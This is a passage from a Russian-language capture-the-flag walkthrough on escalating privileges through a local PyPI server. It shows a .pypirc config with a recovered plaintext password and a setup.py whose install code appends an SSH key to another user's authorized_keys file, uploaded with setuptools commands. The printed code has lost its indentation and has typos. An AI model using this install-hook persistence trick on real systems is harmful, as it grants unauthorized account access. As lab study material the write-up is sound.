получше изучим pypi на сайте видно что для изменения нужна аутентификация, и через шелл мы можем только смотреть, этого хватит, так как мы можем найти логин и пароль в скрытом файле. Осталось разгадать хэш пароля, ну тут тоже ничего сложного.

Однако, банальная аутентификация нам тоже ничего не дала, попробуем заабузить установку модуля тем более **sudo -l** дает нам понять что мы могем.

придется попрогать и поиграть в гадалку

для начала из мануалов становится понятно, что надо с нуля написать файл конфигурации

```
distutils index-servers =

index-servers =

local

local

repository: **

username: pypi

password: soufianeelhaoui
```

получилось что-то вроде такого, а теперь еще и с нуля написать модуль и установщик

```python
try:

with open("/home/low/.ssh/authorized_keys","a") as f:

f.write("key")

f.close()

except Exception as e:

pass

import setuptools

setuptools.setup(

name="kali_username",version="0.0.1",author="Example Author",author_email="author@example.com",descripion="just a file",

long_description="",long_description_content_type="text/markdown",url="https://github.com/pypa/sampleproject",

package=setuptools.find_packages(),classifiers="Programming Language :: Python :: 3","License :: OSI Approved :: MIT License","Operating System :: OS Independent")
```

что-то вроде этого сработало, сначала я пытался написать банальный шелл, после того как убедился в том что все это запускается под тем кем нужно, но шелл возвращал меня в ту же точку, поэтому верным решением было бы создать ssh ключ, так и поступим.

**python setup.py sdist register -r local upload -r local**
